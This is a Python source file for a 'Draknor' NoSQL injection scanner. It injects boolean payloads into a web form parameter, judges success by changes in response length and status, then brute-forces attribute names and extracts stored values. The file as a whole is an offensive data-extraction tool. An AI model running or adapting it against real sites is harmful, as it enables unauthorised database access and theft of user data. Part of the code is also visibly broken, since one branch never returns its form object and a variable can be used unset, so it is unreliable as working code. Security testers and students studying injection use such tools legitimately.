import traceback
import argparse
from payloads import *
from utils import *
import re

#TODO
# implement custom fail string implementation
# implement array payload handling
# implement time based payload handling
                    

def scan_array_payloads():
    #if payload.startswith("%5b"): # %5b = [
        #       r_data = remove_char_at_index(r_data, r_data.index(f"§{index}§")-1)
        #      r_data = r_data.replace(f"§{index}§", payload)
    pass

def scan_bool_payloads(form_data,scan_param_name, baseline_response):    
    success_payloads=[]
    error_payloads=[]

    for payload, extraction_payload in bool_payloads:        
        # prepare data            
        r_data = form_data.parameters.replace(f"§{scan_param_name}§", quote(payload))

        #send request
        response = send_post_request(form_data.url+form_data.action, r_data)

        #is request error
        if response.status_code != baseline_response.status_code:
            print(f"\t[?] Unexpected Status Code: {response.status_code} {payload}")       
            error_payloads.append(payload)
        # is request success
        elif len(response.text) != len(baseline_response.text):            
            print(f"\t[+] SUCCESS:{payload}")       
            success_payloads.append([payload, extraction_payload])     

    return success_payloads, error_payloads


def verify_extraction_point(success_payloads, form_data, scan_param_name, baseline_response):
    print("[+] Verifing extraction point...")
    for _, extraction_payload in success_payloads:         
        print(f"[*] Testing extraction payload: {extraction_payload}")
        if send_extraction_request(form_data, extraction_payload, "true", scan_param_name, baseline_response):                 
            if not send_extraction_request(form_data, extraction_payload, "false", scan_param_name, baseline_response):         
                extraction_point = extraction_payload
                break

    if not extraction_point:
        print("[-] No valid extraction point found")
        exit()
    else: 
        print(f"[+] Valid extraction point found: {extraction_point}")
        return extraction_point

def create_form_data_obj(direct_url, form_extract_target, scan_param_name, post_data):
    # extract post data from html form    
    if form_extract_target:        
        if not scan_param_name: # TODO auto test all params            
            raise Exception("[-] Target parameter (-p) or §parameter_name§ placeholder has to be set")                
    
        return extract_form_data(form_extract_target,scan_param_name)
    elif direct_url:         
        print("[*] Checking supplied form data...")      
        parsed_url = urlparse(direct_url)                
        form_data = AttackTarget(
            url=f"{parsed_url.scheme}://{parsed_url.netloc}",
            action=parsed_url.path
        )
        form_data.method= "GET" if "?" in form_data.action else "POST"
        if post_data:
            form_data.parameters=post_data
        elif form_data.method=="GET":
            form_data.parameters=form_data.action.split("?")[1]
    else:        
        raise Exception("Choose either -e (extract form from URL) or -u (target URL) to select your target")
    
def init():
    parser = argparse.ArgumentParser(description="Simple NoSQL Enumeration Tool")
    parser.add_argument('-u', '--url', help="Scan Url to scan")
    parser.add_argument('-e', '--extract', help="Scan Target to extract form from")
    parser.add_argument('-p', '--parameter', help="Parameter to test")
    parser.add_argument('-f', '--fail_string', help="Response string for failed requests")
    parser.add_argument('-d', '--data', help="Post Data")
    #parser.add_argument('--arrays', action='store_true', help="Activate array payloads")
    #parser.add_argument('--time', action='store_true', help="Activate time payload")

    
    args = parser.parse_args()

    # init arg params
    scan_param_name=args.parameter
    direct_url= check_and_correct_url_schema(args.url)
    post_data=args.data
    fail_message=args.fail_string
    form_extract_target=check_and_correct_url_schema(args.extract)

    if not form_extract_target and not direct_url:
        parser.print_help()
        raise Exception("[-] Target url(-u) or target(-t) has to be set")                

    try:
        form_data = create_form_data_obj(direct_url, form_extract_target, scan_param_name, post_data)
    except Exception as e:
        parser.print_help()
        raise e
    
    if not form_data.parameters or not form_data.method or not form_data.action:
        parser.print_help()
        raise Exception("Incomplete form_data object for request: Check input parameters")
    
    
    if not scan_param_name and f"§" not in form_data.parameters:
        parser.print_help()
        raise Exception("[-] Target parameter (-p) or §parameter_name§ placeholder has to be set")                
    
    if scan_param_name and  f"§{scan_param_name}§" not in form_data.parameters:
        print(f"[*] Auto inserting placeholder in parameter {scan_param_name}...")
        form_data.parameters = replace_param_value(form_data.parameters, scan_param_name)

    if not scan_param_name:
        print(f"[*] Auto extracting target parameter from supplied data {form_data.parameters}...")
        pattern = r'=(§(.*?)§)'

        # Search for the pattern in the provided string
        match = re.search(pattern, form_data.parameters)
    
        if match:
            scan_param_name = match.group(2)  
        else:
            raise Exception("Could not extract target parameter from parameter data. Format is name=§value§")
        
    return form_data, scan_param_name


def main():
    print("--- Starting Draknor NoSQL Injection Scanner ---")

    form_data, scan_param_name = init()    

    print("[+] Target form data:", form_data)
    print("[*] Checking if form target page is reflective...")

    baseline_response = get_baseline_response(form_data, scan_param_name)

    # Start Scanning
    success_payloads, error_payloads = scan_bool_payloads(form_data,scan_param_name, baseline_response)

    # display results    
    print("Successfull payloads:")
    for p in success_payloads:
        print(f"\t {p[0]}")
        
    print("Error inflicting payloads:")
    for p in error_payloads:
        print(f"\t {p}")
        

    # verify extraction point    
    extraction_point = verify_extraction_point(success_payloads, form_data, scan_param_name, baseline_response)

    # enumerate attribute names
    found_attributes = brute_attribute_names(form_data,scan_param_name, baseline_response, extraction_point)

    # extract data
    results = []
    for attr, length in found_attributes:
        res = brute_extract_data(form_data,scan_param_name, baseline_response, extraction_point, attr, length)
        if res:
            print(f"[data] {attr}:{res}")   
            results.append([attr, res])
       
    # print results
    print_results(found_attributes, results)

    #if args.arrays:  
    #    scan_array_payloads()

try:
    main()
except KeyboardInterrupt:
    print("\nCTRL+C detected! Draknor shuting down...")
except Exception as e:
    traceback.print_exc()    
